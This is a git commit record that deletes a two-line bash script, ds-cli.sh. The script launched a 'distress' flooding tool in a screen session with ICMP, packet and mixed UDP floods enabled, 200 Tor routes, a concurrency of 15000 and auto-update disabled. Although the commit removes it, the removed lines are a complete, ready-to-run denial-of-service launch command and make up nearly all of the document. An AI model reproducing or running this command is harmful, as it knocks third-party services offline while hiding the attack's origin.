4388581544fb75a8d3af2da22f9d295a5cb84d96
rootkalilocalhost <140280170+rootkalilocalhost@users.noreply.github.com>
2025-07-30 20:22:24 +0300

    Delete ds-cli.sh

--- ds-cli.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-cat ita.txt && sleep 2s && echo user Dubna-48㉿ && sleep 2s && echo module - Distress v0.7.21 && echo -------------------------- && sleep 3s && screen -S 'ds' ./distress_x86_64-unknown-linux-musl --use-my-ip 0 --user-id=1473231416 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --disable-auto-update --use-tor 200 -c 15000
